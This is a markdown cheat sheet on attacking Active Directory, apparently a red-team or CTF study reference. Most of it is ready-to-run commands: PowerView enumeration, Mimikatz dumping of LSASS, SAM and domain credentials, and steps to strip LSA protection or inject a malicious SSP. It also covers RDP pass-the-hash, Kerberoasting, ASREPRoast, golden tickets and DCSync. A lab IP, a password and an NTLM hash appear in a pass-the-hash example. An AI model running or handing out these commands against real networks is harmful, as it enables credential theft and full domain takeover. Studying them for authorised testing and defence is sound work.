# Active Directory

Active Directory follows a clear hierarchy, from top to bottom. In that hierarchy are: forests, trees, and domains.

**Forests:** represent the complete Active Directory instance, and are logical containers made up of domain trees, domains, and organizational units.

**Trees:** are collections of domains within the same DNS namespace; these include child domains.


**Domains:** are logical groupings of network objects such as computers, users, applications, and devices on the network such as printers.

-------------------------------------------------------------------------
- [Active Directory](#active-directory)
    - [Enumeration](#enumeration)
      - [Using PowerView](#using-powerview)
    - [Compromise Active Directory](#compromise-active-directory)
      - [Mimikatz](#mimikatz)
      - [Remote Desktop Protocol](#remote-desktop-protocol)
      - [Kerberoast (Service Account Attacks)](#kerberoast-service-account-attacks)
      - [Password Spray Attack (Low and Slow Password Guessing)](#password-spray-attack-low-and-slow-password-guessing)
      - [Golden Ticket Attack](#golden-ticket-attack)
      - [DCsync Attack](#dcsync-attack)
      - [ASREPRoast](#asreproast)
      - [Pass The Hash](#pass-the-hash)

### Enumeration

#### Using PowerView  

[Powerview v.3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)<br>
[Powerview Wiki](https://powersploit.readthedocs.io/en/latest/)

- **Get Current Domain:** `Get-Domain`
- **Enumerate Other Domains:** `Get-Domain -Domain <DomainName>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Policy:** 
  ```
  Get-DomainPolicy

  #Will show us the policy configurations of the Domain about system access or kerberos
  Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
  Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
  ```
- **Get Domain Controllers:** 
  ```
  Get-DomainController
  Get-DomainController -Domain <DomainName>
  ```
- **Enumerate Domain Users:** (Currently Logged on Users)
  ```
  #Save all Domain Users to a file
  Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

  #Will return specific properties of a specific user
  Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List
  
  #Enumerate user logged on a machine
  Get-NetLoggedon -ComputerName <ComputerName>
  
  #Enumerate Session Information for a machine
  Get-NetSession -ComputerName <ComputerName>
  
  #Enumerate domain machines of the current/specified domain where specific users are logged into
  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
  ```
- **Enum Domain Computers:** 
  ```
  Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
  
  #Enumerate Live machines 
  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
  ```
- **Enum Groups and Group Members:** (Resolving Nested Groups)
  ```
  #Save all Domain Groups to a file:
  Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

  #Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
  Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member 
  Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
  Get-NetLocalGroup | Select-Object GroupName

  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
  Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
  ```
- **Enumerate Shares:**
  ```
  #Enumerate Domain Shares
  Find-DomainShare
  
  #Enumerate Domain Shares the current user has access
  Find-DomainShare -CheckShareAccess
  
  #Enumerate "Interesting" Files on accessible shares
  Find-InterestingDomainShareFile -Include *passwords*
  ```
- **Enum Group Policies:** 
  ```
  Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

  #Enumerate all GPOs to a specific computer
  Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName

  #Get users that are part of a Machine's local Admin group
  Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
  ```
- **Enum OUs:** 
  ```
  Get-DomainOU -Properties Name | Sort-Object -Property Name
  ```
- **Enum ACLs:** 
  ```
  # Returns the ACLs associated with the specified account
  Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs

  #Search for interesting ACEs
  Find-InterestingDomainAcl -ResolveGUIDs
  
  #Check the ACLs associated with a specified path (e.g smb share)
  Get-PathAcl -Path "\\Path\Of\A\Share"
  ```
- **Enum Domain Trust:** 
  ```
  Get-DomainTrust
  Get-DomainTrust -Domain <DomainName>

  #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
  Get-DomainTrustMapping
  ```
- **Enum Forest Trust:** 
  ```
  Get-ForestDomain
  Get-ForestDomain -Forest <ForestName>

  #Map the Trust of the Forest
  Get-ForestTrust
  Get-ForestTrust -Forest <ForestName>
  ```
- **User Hunting:** 
  ```
  #Finds all machines on the current domain where the current user has local admin access
  Find-LocalAdminAccess -Verbose

  #Find local admins on all machines of the domain
  Find-DomainLocalGroupMember -Verbose

  #Find computers were a Domain Admin OR a spesified user has a session
  Find-DomainUserLocation | Select-Object UserName, SessionFromName

  #Confirming admin access
  Test-AdminAccess
  ```
  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit!

### Compromise Active Directory
#### Mimikatz
  ```
  #The commands are in cobalt strike format!
  
  #Dump LSASS: (Cached Credential Storage and Retrieval)
  mimikatz privilege::debug
  mimikatz token::elevate
  mimikatz sekurlsa::logonpasswords
  
  #(Over) Pass The Hash
  mimikatz privilege::debug
  mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
  
  #List all available kerberos tickets in memory (Cached Credential Storage and Retrieval)
  mimikatz sekurlsa::tickets
  
  #Dump local Terminal Services credentials
  mimikatz sekurlsa::tspkg
  
  #Dump and save LSASS in a file
  mimikatz sekurlsa::minidump c:\temp\lsass.dmp
  
  #List cached MasterKeys
  mimikatz sekurlsa::dpapi
  
  #List local Kerberos AES Keys
  mimikatz sekurlsa::ekeys
  
  #Dump SAM Database
  mimikatz lsadump::sam
  
  #Dump SECRETS Database
  mimikatz lsadump::secrets
  
  #Inject and dump the Domain Controler's Credentials
  mimikatz privilege::debug
  mimikatz token::elevate
  mimikatz lsadump::lsa /inject
  
  #Dump the Domain's Credentials without touching DC's LSASS and also remotely
  mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
  
  #List and Dump local kerberos credentials
  mimikatz kerberos::list /dump
  
  #Pass The Ticket
  mimikatz kerberos::ptt <PathToKirbiFile>
  
  #List TS/RDP sessions
  mimikatz ts::sessions
  
  #List Vault credentials
  mimikatz vault::list
  ```
  
 :exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?
 
 - LSA as a Protected Process (Kernel Land Bypass)
 ```
 #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
 reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
 
 #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
 #Now lets import the mimidriver.sys to the system
 mimikatz # !+
 
 #Now lets remove the protection flags from lsass.exe process
 mimikatz # !processprotect /process:lsass.exe /remove
 
 #Finally run the logonpasswords function to dump lsass
 mimikatz # sekurlsa::logonpasswords
 ```
 
 - LSA as a Protected Process (Userland "Fileless" Bypass)
   - [PPLdump](https://github.com/itm4n/PPLdump)
   - [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)
 
 - LSA is running as virtualized process (LSAISO) by Credential Guard
 ```
 #Check if a process called lsaiso.exe exists on the running processes
 tasklist |findstr lsaiso
 
 #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
 #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
 mimikatz # misc::memssp
 
 #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
 ```
  
- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)

#### Remote Desktop Protocol

If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.

- Mimikatz:
```
#We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
privilege::debug
sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"

#Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
```

- xFreeRDP:
```
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress> 
```

:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".

#### Kerberoast (Service Account Attacks)
*WUT IS DIS?:* \
 All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"    
 account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.

  - PowerView:
  ```
  #Get User Accounts that are used as Service Accounts
  Get-NetUser -SPN
  
  #Get every available SPN account, request a TGS and dump its hash
  Invoke-Kerberoast
  
  #Requesting the TGS for a single account:
  Request-SPNTicket
    
  #Export all tickets using Mimikatz
  Invoke-Mimikatz -Command '"kerberos::list /export"'
  ```
  - AD Module:
  ```
  #Get User Accounts that are used as Service Accounts
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  ```
  - Impacket:
  ```
  python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
  
  sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.83.153 -request
  ```
  - Rubeus:
  ```
  #Kerberoasting and outputing on a file with a spesific format
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
  
  #Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec
  
  #Kerberoast AES enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
   
  #Kerberoast spesific user account
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple
  
  #Kerberoast by specifying the authentication credentials 
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
  ```

#### Password Spray Attack (Low and Slow Password Guessing)
  If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse 
  on other domain accounts.

  **Tools:**
  - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
  - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
  - [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
  - [Spray](https://github.com/Greenwolf/Spray)
  - [Spray-Passwords](https://github.com/ZilentJack/Spray-Passwords)
  - [Rubeus](https://github.com/GhostPack/Rubeus)

#### Golden Ticket Attack
  ```
  #Execute mimikatz on DC as DA to grab krbtgt hash:
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

  #On any machine:
  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
  <HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

  secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
  ```
  **Tip:** \
  /ptt -> inject ticket on current running session\
  /ticket -> save the ticket on the system for later use
  

#### DCsync Attack
  ```
  #DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
  Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'
  
  #DCsync using secretsdump.py from impacket with NTLM authentication
  secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm
  
  #DCsync using secretsdump.py from impacket with Kerberos Authentication
  secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
  ```
  **Tip:** \
  /ptt -> inject ticket on current running session \
  /ticket -> save the ticket on the system for later use
  
#### ASREPRoast
 *WUT IS DIS?:* \
  If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted  
  blob and bruteforce it offline. 
 
  - PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
  - AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`


  Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
  Check for interesting permissions on accounts:
  
  
  **Hint:** We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!
  
  PowerView:
  ```
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
  Disable Kerberos Preauth:
  Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
  Check if the value changed:
  Get-DomainUser -PreauthNotRequired -Verbose
  ```

  And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.
  ```
  #Get a spesific Accounts hash:
  Get-ASREPHash -UserName <UserName> -Verbose

  #Get any ASREPRoastable Users hashes:
  Invoke-ASREPRoast -Verbose
  ```

  Using Rubeus:
  ```
  #Trying the attack for all domain users
  Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  
  #ASREPRoast spesific user
  Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  
  #ASREPRoast users of a spesific OU (Organization Unit)
  Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  ```

  Using Impacket:
  ```
  #Trying the attack for the specified users on the file
  python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>

  sudo python3 GetNPUsers.py controller.local/ -usersfile /tmp/user.txt
  ```
#### Pass The Hash
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py THM-AD/backup:backup2517860@10.10.211.190 -dc-ip 10.10.211.190

evil-winrm -i 10.10.211.190 -u administrator -H 0e0363213e37b94221497260b0bcb4fc

```
-----------------------------------------------------------
Cached Credential Storage and Retrieval\
Service Account Attacks (Kerberoast)\
Low and Slow Password Guessing (Password Spray Attack)\
Pass the Hash\
Overpass the Hash\
Pass the Ticket (Silver Ticket)\
Distributed Component Object Model\
Golden Tickets

```
If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: ntpdate <IP of DC>

sudo ntpdate apt.htb.local
```